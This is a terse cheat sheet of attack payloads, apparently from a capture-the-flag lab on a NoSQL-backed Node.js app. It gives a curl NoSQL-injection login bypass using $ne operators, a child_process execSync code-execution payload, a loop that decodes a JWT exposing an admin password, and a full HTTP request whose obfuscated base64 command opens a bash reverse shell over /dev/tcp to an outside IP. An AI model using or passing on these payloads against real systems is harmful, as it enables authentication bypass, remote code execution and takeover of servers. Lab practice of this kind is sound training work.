# NoSql
> Steeling Cookie
```
curl -D header.txt -H "Content-Type: application/json" -XPOST -d '{"username":{"$ne": "foo"},"password":{"$ne": "foo"}}' http://10.10.187.117/admin

```
> execute Command in sql
`{"exec":"require('child_process').execSync('<command>').toString();"}`

> To Crack TheHash
```
export IFS=".";jwt="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc0FkbWluIjp0cnVlLCJfaWQiOiI1ZWM2ZTVjZjFkYzRkMzY0YmY4NjQxMDciLCJ1c2VybmFtZSI6ImRhdmUiLCJwYXNzd29yZCI6IlRITXtTdXBlclNlY3VyZUFkbWluUGFzc3dvcmQxMjN9IiwiX192IjowLCJpYXQiOjE2MDA4NDQ3MDR9.nioG_MjIcRGJ3PObm0QcDv_eIqRU6baBCYAi7aRWVPw";for j in $jwt; do echo "$j" | base64 -d;done

```
> ReverseShell
```
POST /admin/exec HTTP/1.1
Host: 10.10.139.182
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.139.182/admin
Content-Type: application/json
Origin: http://10.10.139.182
Content-Length: 140
Connection: close
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc0FkbWluIjp0cnVlLCJfaWQiOiI1ZWM2ZTVjZjFkYzRkMzY0YmY4NjQxMDciLCJ1c2VybmFtZSI6ImRhdmUiLCJwYXNzd29yZCI6IlRITXtTdXBlclNlY3VyZUFkbWluUGFzc3dvcmQxMjN9IiwiX192IjowLCJpYXQiOjE2MDA4NDQ4MTd9.iYAlMdDV6SaG8TWaDiMyFfS2v69HYoRgFzfUhSMJ2bo

{"exec":"require('child_process').execSync('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjUwLjcyLzQ0NDQgMD4mMQ== | base64 -d | bash').toString();"}

```
